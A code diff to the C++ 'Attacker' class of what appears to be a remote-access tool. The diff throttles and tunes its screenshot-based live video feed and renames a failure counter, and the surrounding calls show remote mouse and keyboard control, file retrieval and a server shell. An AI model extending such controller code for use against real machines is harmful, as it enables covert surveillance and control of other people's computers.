@@ -658,6 +658,7 @@ void Attacker::connectServer(bool pw, std::string ipStr, short port)
 
 	tui.setIsSendingMouse(isSendingMouse);
 	tui.setIsSendingKeyboard(isSendingKeyboard);
+	tui.setIsGettingVideo(isGettingVideo);
 	tui.setClientsOutput("Server connection required");
 	tui.setDatabaseOutput("Server connection and admin privileges required");
 	tui.setInfoTitle(ftxui::text("Not connected") | ftxui::color(ftxui::Color::Red));
@@ -920,9 +921,10 @@ void Attacker::getFile(std::string path, std::string ext, uint32_t numPackets)
 void Attacker::handleVideo()
 {
 	sf::RenderWindow w(sf::VideoMode({ 640, 360 }), "Video Feed", sf::Style::Default);
-	int failedFrames = 0;
+	int framesFailedConsecutively = 0;
 
-	while (w.isOpen() && isGettingVideo && (failedFrames < 5)) {
+	sf::Clock frameClock;
+	while (w.isOpen() && isGettingVideo && (framesFailedConsecutively < 5)) {
 		while (const std::optional event = w.pollEvent()) {
 			if (event->is<sf::Event::Closed>())
 				isGettingVideo = false;
@@ -937,23 +939,29 @@ void Attacker::handleVideo()
 			}
 		}
 
+		if (frameClock.getElapsedTime().asMilliseconds() < 100) {
+			sf::sleep(sf::milliseconds(10));
+			continue;
+		}
+		frameClock.restart();
+
 		sf::Packet req;
 		uint16_t reqId = requestId++;
 		req << reqId << uint8_t(Cmd::SSH_REQUEST_SCREENSHOT);
 		if (server.send(req) != sf::Socket::Status::Done) {
-			failedFrames++;
+			framesFailedConsecutively++;
 			continue;
 		}
 
-		//wait up to 3 seconds for the next frame to be received
-		for (int i = 0; i < 60; i++) {
+		//wait up to 1.5 seconds for the next frame to be received
+		for (int i = 0; i < 50; i++) {
 			if (responsesToProcess.find(reqId) != responsesToProcess.end() || !isGettingVideo)
 				break;
-			sf::sleep(sf::milliseconds(50));
+			sf::sleep(sf::milliseconds(30));
 		}
 		//timeout or error
 		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
-			failedFrames++;
+			framesFailedConsecutively++;
 			continue;
 		}
 
@@ -977,10 +985,10 @@ void Attacker::handleVideo()
 		w.draw(sprite);
 		w.display();
 
-		failedFrames = 0;
+		framesFailedConsecutively = 0;
 	}
 
-	if (failedFrames >= 5)
+	if (framesFailedConsecutively >= 5)
 		tui.printServerShell("video feed failed\n");
 
 	isGettingVideo = false;
